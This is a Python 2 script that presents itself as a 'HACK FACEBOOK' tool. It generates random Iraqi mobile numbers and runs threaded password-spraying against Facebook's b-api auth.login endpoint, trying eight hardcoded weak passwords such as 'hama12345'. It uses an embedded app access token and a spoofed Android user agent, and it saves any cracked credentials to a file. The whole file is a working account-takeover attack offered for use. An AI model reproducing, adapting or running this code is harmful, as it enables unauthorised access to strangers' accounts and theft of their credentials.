import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('')

try:
    import mechanize
except ImportError:
    os.system('')
    time.sleep(1)
    os.system('')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')

os.system("xdg-open https://t.me/anas_hacker0")
logo = """\x1b[1;91m
                                                      
                                                :     
                      L.                       t#,    
                      EW:        ,ft          ;##W.   
             ..       E##;       t#E         :#L:WE   
            ;W,       E###t      t#E        .KG  ,#D  
           j##,       E#fE#f     t#E        EE    ;#f 
          G###,       E#t D#G    t#E       f#.     t#i
        :E####,       E#t  f#E.  t#E       :#G     GK 
       ;W#DG##,       E#t   t#K: t#E        ;#L   LW. 
      j###DW##,       E#t    ;#W,t#E         t#f f#:  
     G##i,,G##,       E#t     :K#D#E          f#D#;   
   :K#K:   L##,       E#t      .E##E           G#t    
  ;##D.    L##,       ..         G#E            t     
  ,,,      .,,                    fE                  
                                   ,                  

"""
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print '\x1b[1;31m[\x1b[1;37m1\x1b[1;31m]\x1b[1;37mHACK FACEBOOK '
    print '      '
    print '\x1b[1;31m[\x1b[1;37m2\x1b[1;31m]\x1b[1;37mDARCHUN'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;37mHALL BZHEA DLLM \x1b[1;91m>>>\x1b[1;97m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97m0770\x1b[1;91m -\x1b[1;97m 770\x1b[1;91m -\x1b[1;97m 751\x1b[1;91m -\x1b[1;97m 771 '
        try:
            c = raw_input(' choise\x1b[1;91m  : ')
            k = ''
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print '[!] Fill Ba Kalk Naya'
        action()
    xxx = str(len(id))
    psb(' ')
    psb('[\x1b[1;97m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m NUMBERS\x1b[1;91m: ' + xxx)
    time.sleep(0.5)
    psb(' ')
    time.sleep(0.1)
    psb('\x1b[1;31m[\x1b[1;97m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m TKAYA CHAWARE KA ...')
    time.sleep(0.5)
    psb(' ')
    time.sleep(0.5)
    psb('\x1b[1;31m[\x1b[1;97m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m BO WASTANDNI TOOL CTRL +Z')
    print 42 * '\x1b[1;30m='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = 'hama12345'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[RAQAM]>>' + k + c + user + ''
                print '\x1b[1;92m|[PASS]>>>' + pass1
                print '\x1b[1;96m##\x1b[1;91mCODE\x1b[1;96m >>\x1b[1;97m+964'
                print '\x1b[1;96m##\x1b[1;91mWLAT\x1b[1;96m >>\x1b[1;97mIRAQ-KURDISTAN'
                print '\x1b[1;96m##\x1b[1;91mTIME \x1b[1;96m>>\x1b[1;97m00-1-12-24'
                print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mANO_RUSSI'
                print '\x1b[1;94m_____________________________________________'
                okb = open('anggaxd/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                cps = open('anggaxd/clone.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = 'hama1234'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[RAQAM]>>' + k + c + user + ''
                    print '\x1b[1;92m|[PASS]>>>' + pass2
                    print '\x1b[1;96m##\x1b[1;91mCODE\x1b[1;96m >>\x1b[1;97m+964'
                    print '\x1b[1;96m##\x1b[1;91mWLAT \x1b[1;96m>>\x1b[1;97mIRAQ + KURDISTAN'
                    print '\x1b[1;96m##\x1b[1;91mTIME\x1b[1;96m >>\x1b[1;97m00-1-12-24'
                    print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                    print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>> \x1b[1;97mFACEBOOK'
                    print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                    print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mANO_RUSSI'
                    print '\x1b[1;94m_____________________________________________'
                    okb = open('anggaxd/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    cps = open('anggaxd/clone.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = 'ahmad12345'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[RAQAM]>>' + k + c + user + ''
                        print '\x1b[1;92m|[PASS]>>>' + pass3
                        print '\x1b[1;96m##\x1b[1;91mCODE \x1b[1;96m>>\x1b[1;97m+964'
                        print '\x1b[1;96m##\x1b[1;91mWLAT \x1b[1;96m>>\x1b[1;97mIRAQ-KURDISTAN'
                        print '\x1b[1;96m##\x1b[1;91mTIME \x1b[1;96m>>\x1b[1;97m00-1-12-24'
                        print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                        print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                        print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                        print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mANO_RUSSI'
                        print '\x1b[1;94m______________________________________________'
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        cps = open('anggaxd/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'ahmad1234'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[RAQAM]>>' + k + c + user + ''
                            print '\x1b[1;92m|[PASS]>>>' + pass4
                            print '\x1b[1;96m##\x1b[1;91mCODE \x1b[1;96m>>\x1b[1;97m+964'
                            print '\x1b[1;96m##\x1b[1;91mWLAT \x1b[1;96m>>\x1b[1;97mIRAQ-KURDISTAN'
                            print '\x1b[1;96m##\x1b[1;91mTIME \x1b[1;96m>>\x1b[1;97m00-1-12-24'
                            print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;97m4/2021'
                            print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                            print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                            print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mANO_RUSSI'
                            print '\x1b[1;94m_____________________________________________'
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            cps = open('anggaxd/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = 'hama1212'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[RAQAM]>>' + k + c + user + ''
                                print '\x1b[1;92m|[PASS]>>>' + pass5
                                print '\x1b[1;96m##\x1b[1;91mCODE \x1b[1;96m>>\x1b[1;97m+964'
                                print '\x1b[1;96m##\x1b[1;91mWLAT \x1b[1;96m>>\x1b[1;97mIRAQ-KURDISTAN'
                                print '\x1b[1;96m##\x1b[1;91mTIME \x1b[1;96m>>\x1b[1;97m00-1-12-24'
                                print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                                print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                                print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                                print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mANO_RUSSI'
                                print '\x1b[1;94m______________________________________________'
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                cps = open('anggaxd/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = 'ahmad1212'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[RAQAM]>>' + k + c + user + ''
                                    print '\x1b[1;92m|[PASS]>>>' + pass6
                                    print '\x1b[1;96m##\x1b[1;91mCODE\x1b[1;96m >>\x1b[1;97m+964'
                                    print '\x1b[1;96m##\x1b[1;91mWLAT\x1b[1;96m >>\x1b[1;97mIRAQ-KURDISTAN'
                                    print '\x1b[1;96m##\x1b[1;91mTIME\x1b[1;96m >>\x1b[1;97m00-1-12-24'
                                    print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                                    print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                                    print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;97mPUBG-FAEBOOK'
                                    print '\x1b[1;96m##\x1b[1;90CODER\x1b[1;96m>>\x1b[1;90mANO_RUSSI'
                                    print '\x1b[1;94m_____________________________________________'
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    cps = open('anggaxd/clone.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 = 'hama123'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[RAQAM]>>' + k + c + user + ''
                                        print '\x1b[1;92m|[PASS]>>>' + pass7
                                        print '\x1b[1;96m##\x1b[1;91mCODE\x1b[1;96m >>\x1b[1;97m+964'
                                        print '\x1b[1;96m##\x1b[1;91mWLAT\x1b[1;96m >>\x1b[1;97mIRAQ-KURDISTAN'
                                        print '\x1b[1;96m##\x1b[1;91mTIME\x1b[1;96m >>\x1b[1;97m00-1-12-24'
                                        print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;97m4/2021'
                                        print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                                        print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;95mPUBG-FACEBOOK'
                                        print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mANO_RUSSI'
                                        print '\x1b[1;94m______________________________________________'
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        cps = open('anggaxd/clone.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                    else:
                                        pass8 = 'ahmad123'
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[RAQAM]>>' + k + c + user + ''
                                            print '\x1b[1;92m|[PASS]>>>' + pass8
                                            print '\x1b[1;96m##\x1b[1;91mCODE \x1b[1;96m>>\x1b[1;97m+964'
                                            print '\x1b[1;96m##\x1b[1;91mWLAT\x1b[1;96m >>\x1b[1;97mIRAQ-KURDISTAN'
                                            print '\x1b[1;96m##\x1b[1;91mTIME\x1b[1;96m >>\x1b[1;97m00-1-12-24'
                                            print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                                            print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                                            print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;95mPUBG-FACEBOOK'
                                            print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mANO_RUSSI'
                                            print '\x1b[1;94m______________________________________________'
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            cps = open('anggaxd/clone.txt', 'a')
                                            cps.write(k + c + user + pass8 + '\n')
                                            cps.close()
                                            cpb.append(c + user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()

